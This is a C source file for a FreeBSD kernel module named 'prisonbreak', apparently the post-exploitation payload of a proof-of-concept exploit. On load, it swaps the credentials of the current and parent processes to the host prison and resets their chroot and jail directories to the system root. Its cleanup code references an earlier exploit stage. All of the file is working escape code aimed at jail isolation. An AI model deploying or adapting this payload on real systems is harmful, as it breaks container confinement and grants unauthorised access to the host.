#include <sys/filedesc.h>
#include <sys/jail.h>
#include <sys/module.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/vnode.h>

extern struct mtx Giant;
extern struct prison prison0;

void poc_unjail_current_process(void);
void poc_unjail_parent_process(void);
void poc_escape_chroot_current_process(void);
void poc_escape_chroot_parent_process(void);

void poc_unjail_current_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct ucred *oldcr, *newcr;

  PROC_LOCK(p);

  oldcr = td->td_ucred;
  /* duplicate creds (also copies refcounts for groups, etc.) */
  newcr = crdup(oldcr);

  /* bump refcount on prison0 for safety */
  prison_hold(&prison0);
  newcr->cr_prison = &prison0;

  /* point both thread + proc to new creds */
  td->td_ucred = newcr;
  p->p_ucred = newcr;

  PROC_UNLOCK(p);
  crfree(oldcr);
}

void poc_unjail_parent_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct proc* pp;
  struct ucred *oldcr, *newcr;

  PROC_LOCK(p);
  pp = p->p_pptr;
  if (pp == NULL) {
    PROC_UNLOCK(p);
    return;
  }
  PROC_LOCK(pp);
  PROC_UNLOCK(p);

  oldcr = pp->p_ucred;
  /* duplicate creds (also copies refcounts for groups, etc.) */
  newcr = crdup(oldcr);

  /* bump refcount on prison0 for safety */
  prison_hold(&prison0);
  newcr->cr_prison = &prison0;

  /* point proc to new creds */
  pp->p_ucred = newcr;

  /* set each thread's cred (for stuff that looks at td_ucred) */
  struct thread* td2;
  FOREACH_THREAD_IN_PROC(pp, td2) { td2->td_ucred = newcr; }

  PROC_UNLOCK(pp);
  crfree(oldcr);
}

void poc_escape_chroot_current_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct pwddesc* process_pwd_desc;

  process_pwd_desc = p->p_pd;
  PWDDESC_XLOCK(process_pwd_desc);

  // NOTE(m): pd_pwd member is an SMR pointer (smrpwd_t) to a struct pwd * and
  // we cannot use it without going though that entire API. So we use some bad
  // code instead to bypass all that and get a pointer to pwd, which we then use
  // to set the directory vnodes to the rootvnode instead.
  struct pwd* pwdptr = *(struct pwd**)&process_pwd_desc->pd_pwd;
  pwdptr->pwd_cdir = rootvnode;
  pwdptr->pwd_rdir = rootvnode;
  pwdptr->pwd_jdir = rootvnode;

  PWDDESC_XUNLOCK(process_pwd_desc);
}

void poc_escape_chroot_parent_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct proc* pp;
  struct pwddesc* process_pwd_desc;

  pp = p->p_pptr;
  process_pwd_desc = pp->p_pd;
  PWDDESC_XLOCK(process_pwd_desc);

  // NOTE(m): pd_pwd member is an SMR pointer (smrpwd_t) to a struct pwd * and
  // we cannot use it without going though that entire API. So we use some bad
  // code instead to bypass all that and get a pointer to pwd, which we then use
  // to set the directory vnodes to the rootvnode instead.
  struct pwd* pwdptr = *(struct pwd**)&process_pwd_desc->pd_pwd;
  pwdptr->pwd_cdir = rootvnode;
  pwdptr->pwd_rdir = rootvnode;
  pwdptr->pwd_jdir = rootvnode;

  PWDDESC_XUNLOCK(process_pwd_desc);
}

/*
 * Event handler for the module.
 */
static int prisonbreak_modevent(module_t mod __unused, int event,
                                void* arg __unused) {
  switch (event) {
    case MOD_LOAD:
      printf("Prisonbreak kernel module loaded\n");

      // Escape jail
      poc_unjail_current_process();
      poc_unjail_parent_process();

      // Escape jail chroot
      poc_escape_chroot_current_process();
      poc_escape_chroot_parent_process();

      // Clean up from exploit
      // NOTE: We have to do this twice for some reason
      mtx_unlock(&Giant);
      mtx_unlock(&Giant);
      struct thread* td = curthread;
      struct proc* p = td->td_proc;
      PROC_LOCK(p);
      thread_exit();

      break;
    default:
      return (EOPNOTSUPP);
  }

  return (0);
}

static moduledata_t prisonbreak_mod = {
    "prisonbreak",        /* module name */
    prisonbreak_modevent, /* event handler */
    NULL                  /* extra data */
};

DECLARE_MODULE(prisonbreak, prisonbreak_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
MODULE_VERSION(prisonbreak, 1);
